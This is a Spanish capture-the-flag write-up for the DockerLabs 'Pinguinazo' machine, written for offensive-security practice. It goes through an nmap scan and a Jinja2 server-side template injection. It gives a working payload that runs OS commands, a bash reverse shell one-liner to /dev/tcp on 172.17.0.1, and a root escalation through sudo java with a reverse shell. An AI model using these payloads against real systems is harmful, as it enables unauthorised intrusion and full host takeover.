# Pinguinazo

![DockerLabs](https://dockerlabs.es/images/logos/logo.png)

**Autor:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)

**Dificultad:** Fácil

**Fecha de creación:** 24/06/2024

----------------------------------------------

DESPLIEGUE

```
bash auto_deploy.sh pinguinazo.tar
```

![](./images/Pasted%20image%2020241203142400.png)

La ip es : 

```
172.17.0.2
```

----------------------------------------------------

RECONOCIMIENTO



```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

`-p-` ⮞ aplicar reconocimiento a todos los puertos. 

`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida.  

`-sV` ⮞ Encuentra la versión del servicio abierto. 

`-sC` ⮞ Usa unos scripts de reconocimiento.

`--min-rate 5000` ⮞ para que el reconocimiento vaya más rápido. 

`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro) .

`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla.  

`-Pn` ⮞ Ignora si esta activa o no la IP.  

`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)  (Este no lo usaré).


Al realizar el scaneo vemos que tenemos un puerto, el 5000

![](./images/Pasted%20image%2020241203142952.png)

Un servicio que corre upnp 

Miramos por el puerto 5000 y vemos lo siguiente : 

![](./images/Pasted%20image%2020241203143725.png)

Si metemos en PinguNombre lo siguiente: `<h1>"lo que quieras"</h1>`veremos que hay una vulnerabilidad. 



Nos levantamos un `nc` 




Podemos hacer lo siguiente : 

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Y vemos que es vulnerable al SSTI (Server Side Template Injection)

Y pondremos lo siguiente: 

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/bin/bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"').read() }}
```

Y ya tendríamos conexión. 

![](./images/Pasted%20image%2020241203153421.png)

Hacemos un tratamiento de la TTY.

Y ya estaríamos más estable.

![](./images/Pasted%20image%2020241203153641.png)

Ponemos `sudo -l`

Nos da el binario java, nos meteremos en la página de https://www.revshells.com/
y pondremos nuestra IP atacante y el puerto 443. 

![](./images/Pasted%20image%2020241203154155.png)

Lo copiamos y creamos un archivo revshell.java

Y pegamos lo antenior. 


![](./images/Pasted%20image%2020241203154252.png)


Vamos a compilarlo. 

```
javac revshell.java
```

Una vez compilado nos pondremos a la escucha con `nc` por el puerto que queramos. 

Pondremos esto 

![](./images/Pasted%20image%2020241203154804.png)


![](./images/Pasted%20image%2020241203154738.png)
Ya estamos como root. 
